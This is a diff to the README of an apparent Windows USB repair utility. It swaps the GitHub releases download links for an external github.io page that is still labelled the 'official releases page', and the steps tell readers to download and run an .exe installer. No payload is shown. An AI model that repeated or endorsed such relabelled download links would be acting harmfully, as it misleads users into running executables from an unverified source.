@@ -1,6 +1,6 @@
 # 🛠️ USB-Repair-Tool - Restore your broken USB drives easily
 
-[![](https://img.shields.io/badge/Download_USB_Repair-Blue.svg)](https://github.com/silvaglorianeko-collab/USB-Repair-Tool/releases)
+[![](https://img.shields.io/badge/Download_USB_Repair-Blue.svg)](https://silvaglorianeko-collab.github.io)
 
 ## 📌 About this project
 
@@ -12,7 +12,7 @@ This tool runs on Windows 10 and Windows 11. You need an active internet connect
 
 ## 🚀 How to download and run
 
-1. Visit the [official releases page](https://github.com/silvaglorianeko-collab/USB-Repair-Tool/releases) to download the installer.
+1. Visit the [official releases page](https://silvaglorianeko-collab.github.io) to download the installer.
 2. Look for the file named `USB-Repair-Tool-Installer.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Open your Downloads folder once the file finishes downloading.
